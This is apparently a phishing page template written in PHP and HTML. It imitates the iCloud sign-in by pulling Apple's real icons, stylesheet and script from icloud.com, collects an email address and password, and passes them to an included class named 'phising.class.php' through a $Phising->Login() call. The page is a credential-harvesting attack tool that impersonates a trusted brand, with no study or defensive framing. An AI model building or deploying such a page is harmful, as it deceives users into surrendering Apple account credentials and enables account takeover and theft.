<?php 
    require('app\classes\phising.class.php');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="apple-touch-icon" sizes="180x180" href="https://www.icloud.com/system/icloud.com/current/static/apple-touch-icon.png">
        
        <link rel="apple-touch-icon" sizes="120x120" href="https://www.icloud.com/system/icloud.com/current/static/apple-touch-icon-120x120.png">
        
        <link rel="apple-touch-icon" sizes="152x152" href="https://www.icloud.com/system/icloud.com/current/static/apple-touch-icon-152x152.png">
        
        <link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://www.icloud.com/system/icloud.com/current/static/apple-touch-icon-precomposed.png">
        
        <link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://www.icloud.com/system/icloud.com/current/static/apple-touch-icon-120x120-precomposed.png">
        
        <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://www.icloud.com/system/icloud.com/current/static/apple-touch-icon-152x152-precomposed.png">
        
        <link rel="icon" type="image/png" sizes="32x32" href="https://www.icloud.com/system/icloud.com/current/static/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="https://www.icloud.com/system/icloud.com/current/static/favicon-16x16.png">
    <link rel="mask-icon" sizes="any" color="#898989" href="https://www.icloud.com/system/icloud.com/current/static/safari-pinned-tab.svg">    
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="stylesheet" href="app/tpl/css/global.css">
        <script type="text/javascript" src="https://www.icloud.com/system/icloud.com/2303Hotfix61/en-us/main.js" defer=""></script>
        <link rel="stylesheet" href="https://www.icloud.com/system/icloud.com/2303Hotfix61/en-us/main.css">
    <title>iCloud</title>
</head>
<body>
    <div class="main p-4">
        <form action="" method="POST">
            <input type="text" name="email" id="email" placeholder="Email" class="border p-2"> <br> </br>
            <input type="password" name="password" id="password" placeholder="Password" class="border p-2"> <br> </br>
            <input type="submit" value="Logga in" name="submit" class="border p-2">
            <?php 

                $Phising->Login();
            ?>
        </form>
    </div>
</body>
</html>